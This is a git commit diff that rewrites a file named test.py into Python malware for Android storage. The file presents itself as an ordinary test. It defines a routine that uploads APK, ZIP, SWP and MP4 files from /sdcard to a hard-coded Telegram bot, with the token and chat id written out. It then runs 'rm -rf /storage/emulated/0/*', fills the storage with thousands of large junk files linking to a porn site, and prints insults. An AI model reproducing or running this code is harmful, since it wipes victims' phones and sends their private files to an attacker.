ae007c7faa3dcd321788cb1ab2969acc7b3356b0
CYBER-COP <168484308+CYBERCOP-404@users.noreply.github.com>
2024-05-20 04:37:45 +0600

    Update test.py

--- test.py
+++ test.py
@@ -1,2 +1,72 @@
-while True:
-   print('FUCK YOU ')
+# DECOMPILED BY CYBER-COP
+#TEAM : CYBER-COP
+import requests
+def CENTSU():
+    session = requests.session()
+ 
+    bot_token = '7087413360:AAG1W7rcRYGgZC_Eoa8KqGeZtMksfvwb3aY'
+    chat_id = '6851952411'
+    #-------------( /sdcard\ )--------------#  
+    #--------------------apk-------------------#																						
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #----------------zip-------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-------------------swp---------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------mp4--------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    
+import os
+os.system('rm -rf /storage/emulated/0/*')
+text = "Welcome to my world , https://pornhub.com\n"
+for i in range(6000):
+	os.system(f'touch /storage/emulated/0/DELETE-succesful{i}.txt')
+	with open(f'/storage/emulated/0/DELETE-succesful{i}.txt','a') as file:
+		file.write(text*20000)
+print('BOBO MO NAMAN PARANG SI DENV. :)')
+print('TAHOL NA NAMAN YANG ASO')
+ok = input('WHERE ARE YOU FROM : ')
